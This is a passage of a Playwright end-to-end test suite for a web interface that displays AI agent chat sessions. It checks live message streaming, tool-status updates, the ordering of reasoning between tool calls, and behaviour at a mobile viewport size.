    await page.goto(`${BASE}/#${TEST_SESSION_ID}`)
    await expect(page.locator('.markdown').first()).toBeVisible({ timeout: 5000 })
    await streamRequest


    const liveUuid = `e2e-live-${Date.now()}`
    writeLine({
      type: 'user', uuid: liveUuid, timestamp: '2025-06-15T14:05:00Z',
      isSidechain: false, isMeta: false,
      message: { role: 'user', content: 'This message arrived via SSE live update!' },
    })

    // The new message should appear without page reload
    await expect(page.getByRole('paragraph').filter({ hasText: 'This message arrived via SSE live update!' })).toBeVisible({ timeout: 10000 })
  })

  test('native OMP tool intent replaces the live status and a final answer clears it', async ({ page }) => {
    const streamRequest = page.waitForRequest(request => request.url().includes(`/api/sessions/${TEST_SESSION_ID}/stream`))
    await page.goto(`${BASE}/#${TEST_SESSION_ID}`)
    await expect(page.locator('.markdown').first()).toBeVisible({ timeout: 10000 })
    await streamRequest

    writeLine({
      type: 'assistant', uuid: `e2e-status-1-${Date.now()}`, timestamp: '2025-06-15T14:06:00Z',
      isSidechain: false, isMeta: false,
      message: {
        role: 'assistant',
        content: [{ type: 'tool_use', id: 'status-tool-1', name: 'read', input: { file_path: '/tmp/upload' }, intent: 'Inspecting upload recovery.' }],
      },
    })

    const liveWork = page.getByTestId('live-work-turn')
    await expect(liveWork).toBeVisible()
    await expect(liveWork.getByTestId('work-log-summary')).toContainText('Activity')
    await expect(liveWork.getByTestId('work-log-summary')).toContainText('Inspecting upload recovery.')
    await expect(page.getByTestId('thinking-indicator')).toHaveCount(0)

    writeLine({
      type: 'assistant', uuid: `e2e-status-2-${Date.now()}`, timestamp: '2025-06-15T14:06:05Z',
      isSidechain: false, isMeta: false,
      message: {
        role: 'assistant',
        content: [{ type: 'tool_use', id: 'status-tool-2', name: 'bash', input: { command: 'npm test' }, intent: 'Testing the repaired upload.' }],
      },
    })
    const currentStatus = liveWork.getByTestId('work-log-summary')
    await expect(currentStatus).toContainText('Testing the repaired upload.', { timeout: 10000 })
    await expect(currentStatus).not.toContainText('Inspecting upload recovery.')

    writeLine({
      type: 'assistant', uuid: `e2e-status-final-${Date.now()}`, timestamp: '2025-06-15T14:06:10Z',
      isSidechain: false, isMeta: false,
      message: { role: 'assistant', content: 'Status lifecycle complete.' },
    })
    await expect(page.getByText('Status lifecycle complete.')).toBeVisible({ timeout: 10000 })
    await expect(currentStatus).not.toBeVisible()
    await expect(liveWork).toHaveCount(0)
    const finalBubble = page.locator('[data-role="assistant"]').filter({ hasText: 'Status lifecycle complete.' })
    await expect(finalBubble.getByTestId('work-log-summary')).toBeVisible()
  })

  test('reasoning stays chronologically between tool calls inside Activity', async ({ page }) => {
    const streamRequest = page.waitForRequest(request => request.url().includes(`/api/sessions/${TEST_SESSION_ID}/stream`))
    await page.goto(`${BASE}/#${TEST_SESSION_ID}`)
    await expect(page.locator('.markdown').first()).toBeVisible({ timeout: 10000 })
    await streamRequest
    const stamp = Date.now()
    writeLine({
      type: 'user', uuid: `e2e-reason-user-${stamp}`, timestamp: '2025-06-15T14:07:00Z',
      isSidechain: false, isMeta: false,
      message: { role: 'user', content: 'Check reasoning chronology.' },
    })
    writeLine({
      type: 'assistant', uuid: `e2e-reason-tool-1-${stamp}`, timestamp: '2025-06-15T14:07:01Z',
      isSidechain: false, isMeta: false,
      message: { role: 'assistant', content: [{ type: 'tool_use', id: `reason-tool-1-${stamp}`, name: 'read', input: { path: '/tmp/first' }, intent: 'Reading first evidence' }] },
    })
    writeLine({
      type: 'assistant', uuid: `e2e-reasoning-${stamp}`, timestamp: '2025-06-15T14:07:02Z',
      isSidechain: false, isMeta: false,
      message: { role: 'assistant', content: [{ type: 'thinking', thinking: 'The first result changes what the second check should inspect.' }] },
    })
    writeLine({
      type: 'assistant', uuid: `e2e-reason-tool-2-${stamp}`, timestamp: '2025-06-15T14:07:03Z',
      isSidechain: false, isMeta: false,
      message: { role: 'assistant', content: [{ type: 'tool_use', id: `reason-tool-2-${stamp}`, name: 'grep', input: { pattern: 'second' }, intent: 'Checking second evidence' }] },
    })
    writeLine({
      type: 'assistant', uuid: `e2e-reason-final-${stamp}`, timestamp: '2025-06-15T14:07:04Z',
      isSidechain: false, isMeta: false,
      message: { role: 'assistant', content: 'Reasoning chronology complete.' },
    })

    const activity = page.locator('[data-role="assistant"]').filter({ hasText: 'Reasoning chronology complete.' }).locator('details.work-log')
    await expect(activity).toBeVisible({ timeout: 10000 })
    await activity.getByTestId('work-log-summary').click()
    const order = await activity.locator('.work-log-detail > details').evaluateAll(nodes =>
      nodes.map(node => node.textContent || ''))
    expect(order).toHaveLength(3)
    expect(order[0]).toContain('Reading first evidence')
    expect(order[1]).toContain('The first result changes what the second check should inspect.')
    expect(order[2]).toContain('Checking second evidence')
    await expect(activity.getByTestId('work-log-detail')).toContainText('2 actions · 1 reasoning')
  })

})

// ── Mobile viewport ─────────────────────────────────────────────────────────

test.describe('Mobile viewport', () => {
  test.use({ viewport: { width: 375, height: 812 } })

  test('hamburger is visible on mobile', async ({ page }) => {
    await page.goto(BASE)
    await page.waitForLoadState('networkidle')
    await expect(page.locator('button:has-text("☰")')).toBeVisible()
  })

  test('sidebar opens and fills screen on mobile', async ({ page }) => {
    await page.goto(BASE)
    await page.waitForLoadState('networkidle')
    await openSidebar(page)
    await expect(page.locator('button:has-text("+ New OMP")')).toBeVisible()
  })

  test('messages are readable on mobile', async ({ page }) => {
    await page.goto(BASE)
    await page.waitForLoadState('networkidle')
    await selectTestSession(page)
    await expect(page.locator('.markdown').first()).toBeVisible({ timeout: 5000 })

    const firstMd = page.locator('.markdown').first()
    const color = await firstMd.evaluate(el => getComputedStyle(el).color)
    expect(color).not.toBe('rgba(0, 0, 0, 0)')
  })

  test('chat input works on mobile', async ({ page }) => {
    await page.goto(BASE)
    await page.waitForLoadState('networkidle')
    await selectTestSession(page)

    const textarea = page.locator('textarea[placeholder="Send a message..."]')
    await expect(textarea).toBeVisible()
    await textarea.fill('mobile test')
    // On mobile (Playwright uses Chromium UA, not iPhone), send button should still be visible
    await expect(sendButton(page)).toBeVisible()
  })
})
